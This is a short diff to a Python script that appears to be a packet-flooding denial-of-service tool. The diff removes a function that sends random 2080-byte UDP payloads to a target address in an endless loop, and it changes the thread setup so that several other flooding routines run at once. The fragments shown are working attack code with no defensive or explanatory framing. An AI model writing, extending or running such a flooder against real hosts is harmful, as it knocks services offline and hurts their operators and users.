@@ -85,21 +85,6 @@ def run5():
             s.close()
             print("[X] Send!!!") 
 
-def run6():
-    data = random._urandom(2080)
-    i = random.choice(("[•]","[•]","[•]"))
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect((ip,port))
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-            print(i +" Send!!!")
-        except:
-            s.close()
-            print("[X] Send!!!")
-
 for y in range(threads):
     if choice == 'y':
         th = threading.Thread(target = run)
@@ -108,4 +93,8 @@ for y in range(threads):
         th.start()
     else:
         th = threading.Thread(target = run3)
+        th.start()
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
         th.start()
